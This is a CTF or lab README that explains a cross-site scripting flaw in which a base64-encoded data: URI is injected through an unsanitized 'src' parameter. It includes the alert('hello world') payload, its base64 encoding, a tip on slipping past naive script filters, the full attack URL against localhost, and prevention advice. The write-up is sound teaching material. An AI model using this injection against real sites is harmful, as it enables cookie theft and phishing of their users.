# README — Simple,  explanation of the issue (with `hello world` example)

> Purpose: a short and very plain English explanation for people who aren’t web developers or security folks.
> Audience: someone who found this page in a CTF or a learning lab and wants to understand what happened and why it’s important.

---


---

## 1 — What the vulnerability is (OWASP Classification)


This falls under **OWASP Top 10 - A03:2021 Injection**, specifically **Cross-Site Scripting (XSS)**. It's a client-side code injection attack where untrusted data is included in a web page without proper validation or escaping, allowing attackers to execute malicious scripts in victims' browsers.

**Attack Vector**: Data URI injection through an unsanitized URL parameter.

---

## 2 — Why `data:` URIs matter

* A `data:` URI lets you put the content directly in the URL.
* Instead of pointing to an image file, it can *contain* a tiny HTML page.
* If the site renders it without checking, the browser runs that HTML.

---

## 3 — How the attack works

1. Identify the vulnerable parameter (`src`).
2. Make a small HTML snippet:

```html
<script>alert('hello world')</script>
```

3. Encode it in Base64:

```bash
echo "<script>alert('hello world')</script>" | base64
```
>Why Base64 in that attack flow?
data: URIs must contain safe ASCII and Bypasses naive filters that look for '   script' or other tokens

* It gives me this

```txt
PHNjcmlwdD5hbGVydCgnaGVsbG8gd29ybGQnKTwvc2NyaXB0Pgo=
```


4. Build a `data:` URI:

```
data:text/html;base64,<BASE64_HERE>
```


5. Replace `src` in the URL with your `data:` URI.


* It will become 
```txt 
http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8gd29ybGQnKTwvc2NyaXB0Pgo=
```

6. Visit the URL — the browser runs your JavaScript.

---

## 4 — Why this is risky

Even though our example just shows `alert('hello world')`, the same method can:

* Show fake content or phish users.
* Steal cookies or session tokens.
* Modify the page or load malicious resources.

---

## 5 — How to prevent it

* Don’t trust user input. Only allow known filenames.
* Disallow `data:`, `javascript:`, or unexpected schemes.
* Validate input length and characters.
* Serve files from a safe location, not from raw input.
* Consider Content Security Policy (CSP) to block inline scripts.
* Escape or sanitize user-provided content before rendering.
